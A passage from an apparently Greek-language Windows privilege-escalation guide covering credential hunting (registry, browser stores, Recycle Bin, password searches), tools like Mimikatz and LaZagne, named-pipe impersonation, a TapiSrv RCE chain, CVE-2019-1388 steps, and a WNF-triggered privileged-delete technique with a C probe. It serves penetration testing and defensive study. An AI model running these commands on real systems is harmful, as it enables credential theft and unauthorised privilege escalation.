Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Διαπιστευτήρια στον RecycleBin

Θα πρέπει επίσης να ελέγξετε τον Κάδο για διαπιστευτήρια

Ελέγξτε τις προσβάσιμες καταχωρίσεις του Recycle Bin για διαγραμμένα αντίγραφα ασφαλείας και αρχεία διαμόρφωσης, καθώς και για αρχεία των οποίων τα ονόματα αναφέρουν ρητά διαπιστευτήρια. Ένα χρήσιμο αντίγραφο ασφαλείας `.7z`, `.zip` ή `.rar` μπορεί να είναι μηνών και να έχει ένα συνηθισμένο όνομα αρχείου. Τα Windows αποθηκεύουν την αρχική διαδρομή και τον χρόνο διαγραφής σε μια εγγραφή `$I` και το διαγραμμένο αρχείο στην αντίστοιχη εγγραφή `$R`· εξετάστε τα μεταδεδομένα και την πρόσβαση ανάγνωσης που έχει η τρέχουσα ταυτότητα πριν ανοίξετε ένα αρχείο αρχειοθέτησης. Η ορατότητα εξαρτάται από τον τόμο, το SID χρήστη και τα δικαιώματα αρχείων, επομένως μια κενή λίστα δεν αποδεικνύει ότι δεν υπάρχει ανακτήσιμο αντίγραφο ασφαλείας. Αντιμετωπίστε το όνομα ενός αρχείου αρχειοθέτησης ως υποψήφιο προς έλεγχο, όχι ως απόδειξη ότι περιέχει έγκυρο μυστικό.

Ένα προσβάσιμο διαγραμμένο `.pfx` μπορεί επίσης να αποτελέσει ένδειξη για **υπογραφή κώδικα**. Αν περιέχει προσβάσιμο ιδιωτικό κλειδί, το κλειδί μπορεί να υπογράψει ένα τροποποιημένο PowerShell script· [το PowerShell απαιτεί πιστοποιητικό υπογραφής κώδικα με ιδιωτικό κλειδί](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), ενώ [οι κανόνες εκδότη του AppLocker αξιολογούν την ταυτότητα του υπογράφοντος και το εύρος του κανόνα](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Η εκτέλεση από διαφορετικό λογαριασμό απαιτεί η τρέχουσα ταυτότητα να μπορεί να τροποποιήσει το συγκεκριμένο script, να ισχύει ένας κανόνας που αποδέχεται την υπογραφή που προκύπτει για το script και τον λογαριασμό-στόχο, καθώς και μια προγραμματισμένη εργασία ή άλλη διεργασία με υψηλότερα δικαιώματα που πράγματι το εκτελεί. Ένα όνομα αρχείου `.pfx`, το θέμα ενός πιστοποιητικού ή ένα εγγράψιμο script από μόνο του δεν τεκμηριώνει αυτή την αλυσίδα. Ελέγξτε τα μεταδεδομένα, τα ACL, την πολιτική και την προγραμματισμένη εντολή πριν ανοίξετε υλικό ιδιωτικού κλειδιού ή ενεργοποιήσετε την εργασία.

Ελέγξτε επίσης προσβάσιμες βάσεις δεδομένων προφίλ προγραμμάτων ανταλλαγής μηνυμάτων, σημειώσεις και ληφθέντα αρχεία για ενδείξεις διαπιστευτηρίων. Ένα αρχείο εξαγωγής κλειδιού ανάκτησης BitLocker μπορεί να είναι αποθηκευμένο ως HTML ή TXT, μερικές φορές μέσα σε ένα αντίγραφο ασφαλείας με σχετικό όνομα. Τέτοιο υλικό μπορεί να παρέχει πρόσβαση σε ξεχωριστό κρυπτογραφημένο τόμο δεδομένων που περιέχει παλαιότερα αντίγραφα ασφαλείας· ελέγξτε τον τόμο και το αρχείο αρχειοθέτησης μόνο εφόσον έχετε εξουσιοδότηση πρόσβασης. Αν ένα αντίγραφο ασφαλείας περιλαμβάνει `NTDS.dit`, η ανάκτηση διαπιστευτηρίων τομέα εκτός σύνδεσης απαιτεί επίσης την αντίστοιχη ομάδα μητρώου `SYSTEM`, όπως περιγράφεται στη [ροή εργασίας αντιγράφων ασφαλείας και προνομιούχων ομάδων](../active-directory-methodology/privileged-groups-and-token-privileges.md). Τα ονόματα αρχείων και ένας κλειδωμένος τόμος από μόνα τους δεν αποδεικνύουν ότι υπάρχει χρησιμοποιήσιμο κλειδί ανάκτησης ή αντίγραφο ασφαλείας τομέα.

Για να **ανακτήσετε κωδικούς πρόσβασης** που έχουν αποθηκευτεί από διάφορα προγράμματα, μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο registry

**Άλλα πιθανά κλειδιά registry με διαπιστευτήρια**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Εξαγωγή κλειδιών openssh από το registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό προγραμμάτων περιήγησης

Θα πρέπει να ελέγξετε για βάσεις δεδομένων όπου αποθηκεύονται κωδικοί πρόσβασης από το **Chrome ή το Firefox**.\
Θα πρέπει να ελέγξετε για βάσεις δεδομένων όπου αποθηκεύονται κωδικοί πρόσβασης από το **Chrome, το Edge ή το Firefox**.\
Ελέγξτε επίσης το ιστορικό, τους σελιδοδείκτες και τα αγαπημένα των προγραμμάτων περιήγησης, καθώς μπορεί να έχουν αποθηκευτεί εκεί **κωδικοί πρόσβασης**.

Για το συμβατικό προφίλ **Default** του Edge του τρέχοντος χρήστη, το `Login Data` βρίσκεται στο `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, ενώ το `Local State` βρίσκεται στον γονικό κατάλογο `User Data`. [Η Microsoft τεκμηριώνει την προεπιλεγμένη θέση του προφίλ](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)· κάποιο άλλο προφίλ ή μια πολιτική `UserDataDir` μπορεί να αλλάξει τη θέση του. Η ύπαρξη αρχείων αποτελεί μόνο ένδειξη για πιθανή αποθήκευση διαπιστευτηρίων: επιβεβαιώστε ότι τα αρχεία είναι αναγνώσιμα, ότι διαθέτετε το κατάλληλο περιβάλλον DPAPI του συγκεκριμένου χρήστη ή άλλο εξουσιοδοτημένο βασικό υλικό και ότι η αποθηκευμένη σύνδεση ανήκει σε λογαριασμό με περισσότερα προνόμια. Η απαρίθμηση μόνο των διαδρομών δεν απαιτεί το άνοιγμα της βάσης δεδομένων ή την εμφάνιση αποκρυπτογραφημένων κωδικών πρόσβασης.

Για το Firefox, [η Mozilla τεκμηριώνει](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) ότι τα `key4.db` και `logins.json` ενός προφίλ είναι τα αντίστοιχα αρχεία κλειδιού και κρυπτογραφημένων συνδέσεων. Η παρουσία τους αποτελεί μόνο ένδειξη: ελέγξτε αν είναι και τα δύο αναγνώσιμα, αν υπάρχουν αποθηκευμένες καταχωρίσεις και αν το κλειδί προστατεύεται με Primary Password, προτού συμπεράνετε ότι τα διαπιστευτήρια μπορούν να χρησιμοποιηθούν. Αν ένα διαπιστευτήριο που ανακτήθηκε ανήκει σε λογαριασμό τομέα, ελέγξτε ξεχωριστά τα πραγματικά δικαιώματα ελέγχου ομάδων αυτού του λογαριασμού και τα δικαιώματα ανάγνωσης ή αποκρυπτογράφησης του κωδικού πρόσβασης LAPS της ομάδας [LAPS password read or decrypt rights](../active-directory-methodology/laps.md)· τα τεχνουργήματα του προγράμματος περιήγησης από μόνα τους δεν αποδεικνύουν ότι υπάρχει διαδρομή προς δικαιώματα διαχειριστή.

Εργαλεία για την εξαγωγή κωδικών πρόσβασης από προγράμματα περιήγησης:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Αντικατάσταση COM DLL**

Το **Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows, η οποία επιτρέπει την **επικοινωνία** μεταξύ στοιχείων λογισμικού γραμμένων σε διαφορετικές γλώσσες. Κάθε στοιχείο COM **αναγνωρίζεται μέσω ενός class ID (CLSID)** και εκθέτει λειτουργικότητα μέσω μίας ή περισσότερων διεπαφών, οι οποίες αναγνωρίζονται μέσω interface IDs (IIDs).

Οι κλάσεις και οι διεπαφές COM ορίζονται στο registry, αντίστοιχα στις θέσεις **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface**. Αυτό το registry δημιουργείται με τη συγχώνευση των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSID αυτού του registry μπορείτε να βρείτε το θυγατρικό κλειδί registry **InProcServer32**, το οποίο περιέχει μια **προεπιλεγμένη τιμή** που δείχνει σε ένα **DLL** και μια τιμή με όνομα **ThreadingModel**, η οποία μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single ή Multi) ή **Neutral** (Thread Neutral).

![Ιστορικό προγραμμάτων περιήγησης - Αντικατάσταση COM DLL: Μέσα στα CLSID αυτού του registry μπορείτε να βρείτε το θυγατρικό κλειδί registry InProcServer32, το οποίο περιέχει μια προεπιλεγμένη τιμή που δείχνει σε ένα DLL και μια τιμή...](<../../images/image (729).png>)

Βασικά, αν μπορείτε να **αντικαταστήσετε οποιοδήποτε από τα DLL** που πρόκειται να εκτελεστούν, θα μπορούσατε να **κλιμακώσετε τα προνόμιά σας**, εφόσον αυτό το DLL εκτελεστεί από διαφορετικό χρήστη.

Για να μάθετε πώς οι attackers χρησιμοποιούν το COM Hijacking ως μηχανισμό persistence, δείτε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Γενική αναζήτηση κωδικών πρόσβασης σε αρχεία και registry**

**Αναζήτηση περιεχομένου αρχείων**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Αναζήτηση αρχείου με συγκεκριμένο όνομα**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Αναζητήστε στο μητρώο ονόματα κλειδιών και κωδικούς πρόσβασης**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Εργαλεία αναζήτησης κωδικών πρόσβασης

Το [**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα plugin του msf** που δημιούργησα για να **εκτελεί αυτόματα κάθε POST module του metasploit που αναζητά διαπιστευτήρια** μέσα στο θύμα.\
Το [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν κωδικούς πρόσβασης και αναφέρονται σε αυτήν τη σελίδα.\
Το [**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμη εξαιρετικό εργαλείο για την εξαγωγή κωδικών πρόσβασης από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **ονόματα χρήστη** και **κωδικούς πρόσβασης** σε διάφορα εργαλεία που αποθηκεύουν αυτά τα δεδομένα σε απλό κείμενο (PuTTY, WinSCP, FileZilla, SuperPuTTY και RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Φανταστείτε ότι **μια διεργασία που εκτελείται ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) με **πλήρη πρόσβαση**. Η ίδια διεργασία **δημιουργεί επίσης μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά προνόμια, η οποία όμως κληρονομεί όλα τα ανοιχτά handles της κύριας διεργασίας**.\
Έπειτα, αν έχετε **πλήρη πρόσβαση στη διεργασία με χαμηλά προνόμια**, μπορείτε να αποκτήσετε το **ανοιχτό handle προς την προνομιούχα διεργασία που δημιουργήθηκε** με `OpenProcess()` και να **κάνετε inject ένα shellcode**.\
[Διαβάστε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με το **πώς να εντοπίσετε και να εκμεταλλευτείτε αυτή την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διαβάστε αυτή την **άλλη ανάρτηση για μια πληρέστερη εξήγηση σχετικά με το πώς να ελέγξετε και να κάνετε κατάχρηση περισσότερων ανοιχτών handles διεργασιών και threads που κληρονομούνται με διαφορετικά επίπεδα δικαιωμάτων (όχι μόνο πλήρη πρόσβαση)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα τμήματα κοινόχρηστης μνήμης, που αναφέρονται ως **pipes**, επιτρέπουν την επικοινωνία και τη μεταφορά δεδομένων μεταξύ διεργασιών.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Named Pipes**, η οποία επιτρέπει σε άσχετες μεταξύ τους διεργασίες να μοιράζονται δεδομένα, ακόμη και μέσω διαφορετικών δικτύων. Αυτό μοιάζει με αρχιτεκτονική client/server, με ρόλους που ορίζονται ως **named pipe server** και **named pipe client**.

Όταν ένας **client** στέλνει δεδομένα μέσω ενός pipe, ο **server** που δημιούργησε το pipe μπορεί να **υιοθετήσει την ταυτότητα** του **client**, εφόσον διαθέτει τα απαραίτητα δικαιώματα **SeImpersonate**. Ο εντοπισμός μιας **προνομιούχας διεργασίας** που επικοινωνεί μέσω ενός pipe το οποίο μπορείτε να μιμηθείτε, σας δίνει την ευκαιρία να **αποκτήσετε υψηλότερα προνόμια**, υιοθετώντας την ταυτότητα αυτής της διεργασίας όταν αλληλεπιδρά με το pipe που δημιουργήσατε. Για οδηγίες σχετικά με την εκτέλεση μιας τέτοιας επίθεσης, δείτε τους χρήσιμους οδηγούς [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επίσης, το ακόλουθο εργαλείο επιτρέπει την **υποκλοπή επικοινωνίας μέσω named pipe με ένα εργαλείο όπως το Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει την καταγραφή και την προβολή όλων των pipes, ώστε να εντοπίσετε privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Η υπηρεσία Telephony (TapiSrv) σε λειτουργία server εκθέτει το `\\pipe\\tapsrv` (MS-TRP). Ένας απομακρυσμένος, πιστοποιημένος client μπορεί να καταχραστεί τη διαδρομή ασύγχρονων συμβάντων που βασίζεται σε mailslot, ώστε να μετατρέψει το `ClientAttach` σε αυθαίρετη **εγγραφή 4 byte** σε οποιοδήποτε υπάρχον αρχείο στο οποίο έχει δικαίωμα εγγραφής το `NETWORK SERVICE`, και στη συνέχεια να αποκτήσει δικαιώματα διαχειριστή Telephony και να φορτώσει μια αυθαίρετη DLL ως υπηρεσία. Η πλήρης ροή:

- `ClientAttach` με το `pszDomainUser` ορισμένο σε μια υπάρχουσα διαδρομή στην οποία επιτρέπεται η εγγραφή → η υπηρεσία την ανοίγει μέσω `CreateFileW(..., OPEN_EXISTING)` και τη χρησιμοποιεί για εγγραφές ασύγχρονων συμβάντων.
- Κάθε συμβάν γράφει το `InitContext`, το οποίο ελέγχει ο attacker και το οποίο προέρχεται από το `Initialize`, σε αυτό το handle. Καταχωρίστε μια line app με το `LRegisterRequestRecipient` (`Req_Func 61`), ενεργοποιήστε το `TRequestMakeCall` (`Req_Func 121`), ανακτήστε το μέσω `GetAsyncEvents` (`Req_Func 0`) και, στη συνέχεια, καταργήστε την καταχώριση/τερματίστε τη σύνδεση για να επαναλάβετε τις ντετερμινιστικές εγγραφές.
- Προσθέστε τον εαυτό σας στο `[TapiAdministrators]` στο `C:\Windows\TAPI\tsec.ini`, συνδεθείτε ξανά και, στη συνέχεια, καλέστε το `GetUIDllName` με μια αυθαίρετη διαδρομή DLL για να εκτελέσετε το `TSPI_providerUIIdentify` ως `NETWORK SERVICE`.

Περισσότερες λεπτομέρειες:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Διάφορα

### Επεκτάσεις αρχείων που μπορούν να εκτελέσουν περιεχόμενο στα Windows

Δείτε τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### Κατάχρηση Protocol handler / ShellExecute μέσω Markdown renderers

Οι clickable σύνδεσμοι Markdown που προωθούνται στο `ShellExecuteExW` μπορούν να ενεργοποιήσουν επικίνδυνους URI handlers (`file:`, `ms-appinstaller:` ή οποιοδήποτε καταχωρισμένο scheme) και να εκτελέσουν αρχεία που ελέγχει ο attacker ως ο τρέχων χρήστης. Δείτε:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Παρακολούθηση command lines για κωδικούς πρόσβασης**

Όταν αποκτάτε shell ως χρήστης, ενδέχεται να εκτελούνται προγραμματισμένες εργασίες ή άλλες διεργασίες που **περνούν διαπιστευτήρια στη command line**. Το παρακάτω script καταγράφει τις command lines των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας τυχόν διαφορές.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Κλοπή κωδικών πρόσβασης από διεργασίες

## Από χρήστη χαμηλών προνομίων σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχετε πρόσβαση στο γραφικό περιβάλλον (μέσω κονσόλας ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις των Microsoft Windows μπορείτε να εκτελέσετε ένα terminal ή οποιαδήποτε άλλη διεργασία ως "NT\AUTHORITY SYSTEM", από έναν χρήστη χωρίς προνόμια.

Έτσι είναι δυνατή η ταυτόχρονη κλιμάκωση προνομίων και παράκαμψη του UAC, αξιοποιώντας την ίδια ευπάθεια. Επιπλέον, δεν χρειάζεται να εγκαταστήσετε τίποτα και το binary που χρησιμοποιείται κατά τη διαδικασία είναι υπογεγραμμένο και εκδοθέν από τη Microsoft.

Μερικά από τα συστήματα που επηρεάζονται είναι τα εξής:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Για να γίνει exploit αυτή η ευπάθεια, πρέπει να εκτελεστούν τα ακόλουθα βήματα:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Έχετε όλα τα απαραίτητα αρχεία και πληροφορίες στο ακόλουθο αποθετήριο GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Από Administrator Medium σε High Integrity Level / UAC Bypass

Διαβάστε αυτό για να **μάθετε σχετικά με τα Επίπεδα ακεραιότητας**:


{{#ref}}
integrity-levels.md
{{#endref}}

Στη συνέχεια, **διαβάστε αυτό για να μάθετε σχετικά με το UAC και τα UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions καταλόγου upload σε root που εξυπηρετείται από web server

Μια εφαρμογή μπορεί να δημιουργήσει έναν προβλέψιμο υποκατάλογο upload, να γράψει σε αυτόν ένα όνομα αρχείου που παρέχει ο καλών και, στη συνέχεια, να επεξεργαστεί το αρχείο. Αν ένας χρήστης με χαμηλά προνόμια μπορεί να αφαιρέσει και να αντικαταστήσει αυτόν τον υποκατάλογο με ένα NTFS junction πριν από την εγγραφή από την πλευρά του server, η εγγραφή μπορεί να ακολουθήσει το junction προς έναν κατάλογο που εξυπηρετείται από web server. Ένα script που τοποθετείται εκεί μπορεί να εκτελεστεί με την ταυτότητα της υπηρεσίας web, αν ο server εκτελεί αυτόν τον τύπο αρχείου. Αυτό είναι ένα όριο αυθαίρετης εγγραφής ειδικό για την εφαρμογή· ένας κατάλογος upload με δυνατότητα εγγραφής ή ένα υπάρχον junction από μόνο του δεν αρκεί για να το αποδείξει.

Ελέγξτε την ακριβή κατασκευή της διαδρομής και τον χρονισμό στον χειριστή upload, τα πραγματικά δικαιώματα διαγραφής/δημιουργίας του χρήστη στον υποκατάλογο, τα πραγματικά ACL του προορισμού, αν η διεργασία εγγραφής ακολουθεί reparse points και αν ο web server εκτελεί αρχεία στον συγκεκριμένο προορισμό. Επιβεβαιώστε ξεχωριστά τις ταυτότητες των διεργασιών της διεργασίας εγγραφής και του web server. Η παθητική απογραφή μπορεί να δείξει ACL καταλόγων και μεταδεδομένα reparse, αλλά δεν μπορεί να εξακριβώσει τη συμπεριφορά του χειριστή ή μια μελλοντική αλλαγή junction. Αν η εκτέλεση καταλήγει σε λογαριασμό υπηρεσίας, ελέγξτε το **πραγματικό token της διεργασίας** προτού εξετάσετε τυχόν ξεχωριστή διαδρομή μέσω δικαιωμάτων token.

## Εκκαθάριση προνομιακής προγραμματισμένης εργασίας που ενεργοποιείται από WNF

Μια προγραμματισμένη εργασία που απορρίπτει τη μη αυτόματη εκτέλεση μπορεί και πάλι να εκθέτει έναν μη προνομιούχο τρόπο ενεργοποίησης. Κατά τον έλεγχο μιας προνομιακής εργασίας, εξαγάγετε το XML της και ελέγξτε **όλους** τους triggers, καθώς και το DACL της εργασίας, τον principal και την ενέργειά της. Συγκεκριμένα, ένα `WnfStateChangeTrigger` ορίζει μια κατάσταση Windows Notification Facility (WNF)· αν αυτή η ασφαλιζόμενη κατάσταση επιτρέπει στον τρέχοντα χρήστη να δημοσιεύσει μια ενημέρωση, ο χρήστης μπορεί έμμεσα να εκκινήσει την εργασία με την ταυτότητα που έχει ρυθμιστεί, παρά το `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Για παράδειγμα, η εργασία Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` εκτελούνταν ως SYSTEM, δεχόταν ενημερώσεις στην κατάσταση WNF `7508BCA32C079E41` από έναν τυπικό χρήστη και, στη συνέχεια, επιθεωρούσε το `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, ακόμη και όταν το Recall ήταν απενεργοποιημένο.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Για να ελέγξετε την προσβασιμότητα, επιλύστε το `ZwUpdateWnfStateData` από το `ntdll.dll`, υποβάλετε μια κενή ενημέρωση για το οκτάμπιτο όνομα κατάστασης και συσχετίστε την κατάσταση επιστροφής με τα δεδομένα τελευταίας εκτέλεσης της εργασίας ή τη δραστηριότητα στο Procmon. Το παρακάτω απλοποιημένο probe χρησιμοποιεί την ακολουθία byte από το παράδειγμα της εργασίας Recall· αντικαταστήστε τα byte με αυτά που εξήχθησαν για την εργασία που δοκιμάζετε.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Μετατροπή του αναδρομικού cleanup σε διαγραφή με προνόμια

Το χρήσιμο primitive δεν είναι μόνο το trigger, αλλά μια προνομιούχα ρουτίνα cleanup που δέχεται έναν κατάλογο ελεγχόμενο από τον attacker. Ακολουθήστε τη λειτουργία από την απαρίθμηση έως την τελική μεταβολή: η ανακάλυψη προφίλ/συνεδριών, τα παιδιά που επιλέγονται μέσω wildcard, τα `SHCreateItemFromParsingName` και `IFileOperation::DeleteItem` αποτελούν ισχυρές ενδείξεις ότι ένα pathname που ελέγχθηκε προηγουμένως θα διασχιστεί αργότερα αναδρομικά. Αν οι απόγονοι δεν ανοίγονται σε σχέση με έμπιστα directory handles και δεν επικυρώνονται πριν από τη διαγραφή, ο attacker μπορεί να αλλάξει την επίλυση της διαδρομής μεταξύ απαρίθμησης και χρήσης.<sup>[[43]](#references)</sup>

Συνδυάστε το WNF trigger με την [αντικατάσταση μέσω oplock, junction και Object Manager symlink](#from-folder-contents-delete-to-system-eop) που περιγράφεται παρακάτω: το oplock θέτει σε παύση το cleaner αφού επιλέξει το νόμιμο παιδί, ενώ ο εγγράψιμος πρόγονος αντικαθίσταται, ώστε η προνομιούχα διαγραφή που συνεχίζεται να επιλύεται μέσω του `\RPC Control` στον προστατευμένο στόχο. Στην αλυσίδα Recall αυτό οδήγησε στη διαγραφή του `C:\Config.Msi` από το SYSTEM, η οποία απαιτείται για την τεκμηριωμένη τεχνική MSI rollback.<sup>[[31]](#references)[[43]](#references)</sup>

### Οι εμφωλευμένοι απόγονοι παρακάμπτουν τις επιφανειακές διορθώσεις για reparse points

Η επικύρωση μόνο της ρίζας που ελέγχει ο attacker και του άμεσου παιδιού της δεν ασφαλίζει μια αναδρομική διαγραφή βάσει pathname. Διατηρήστε αυτά τα ελεγμένα αντικείμενα νόμιμα και μετακινήστε την αντικατάσταση μέσω junction/oplock σε ένα επιπλέον παιδί κάτω από αυτά· το `IFileOperation::DeleteItem` τελικά φτάνει στον μη επικυρωμένο απόγονο και ακολουθεί τον νέο στόχο του. Το CVE-2026-20941 προέκυψε ακριβώς από αυτή την κατηγορία ελλιπούς διόρθωσης, αφού η πρώτη διόρθωση του Recall επικύρωσε τα `UKP` και τον κατάλογο με μορφή GUID, αλλά διατήρησε την παλιά λειτουργία αναδρομικής διαγραφής.<sup>[[43]](#references)</sup>

Η ασφαλής πρακτική είναι να ανοίγετε **κάθε απόγονο** σε σχέση με ένα ήδη έμπιστο directory handle, να λαμβάνετε και να επαληθεύετε την τελική επιλυμένη διαδρομή/το αντικείμενο και να εφαρμόζετε τη disposition διαγραφής σε αυτό το επαληθευμένο handle. Μην επικυρώνετε ένα πρόθεμα και μετά επιστρέφετε σε αναδρομική διαγραφή βάσει διαδρομής. Κατά την ανασκόπηση των patches, εξετάστε επίσης τις δομές στο πραγματικό call site: σε αυτή την περίπτωση, η επιθεώρηση κατά την εκτέλεση του `OBJECT_ATTRIBUTES` στο `NtCreateFile` έδειξε μη μηδενικό `RootDirectory` και σχετικό όνομα `{GUID}\\secure_file.lock`, καταρρίπτοντας την παραπλανητική έξοδο του decompiler που υπέδειξε ένα δεύτερο primitive `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Από αυθαίρετη διαγραφή/μετακίνηση/μετονομασία φακέλου σε SYSTEM EoP

Η τεχνική περιγράφεται [**σε αυτήν την ανάρτηση ιστολογίου**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), με exploit code [**διαθέσιμο εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Η επίθεση συνίσταται ουσιαστικά στην κατάχρηση της δυνατότητας rollback του Windows Installer, ώστε να αντικατασταθούν νόμιμα αρχεία με κακόβουλα κατά τη διαδικασία απεγκατάστασης. Για αυτό, ο attacker πρέπει να δημιουργήσει έναν **κακόβουλο MSI installer**, ο οποίος θα χρησιμοποιηθεί για να υποκλέψει τον φάκελο `C:\Config.Msi`. Ο φάκελος θα χρησιμοποιηθεί αργότερα από το Windows Installer για την αποθήκευση αρχείων rollback κατά την απεγκατάσταση άλλων πακέτων MSI, όπου τα αρχεία rollback θα έχουν τροποποιηθεί ώστε να περιέχουν το κακόβουλο payload.

### Έγχυση διαδρομής cleanup του Windows Installer COM (CVE-2025-27727)

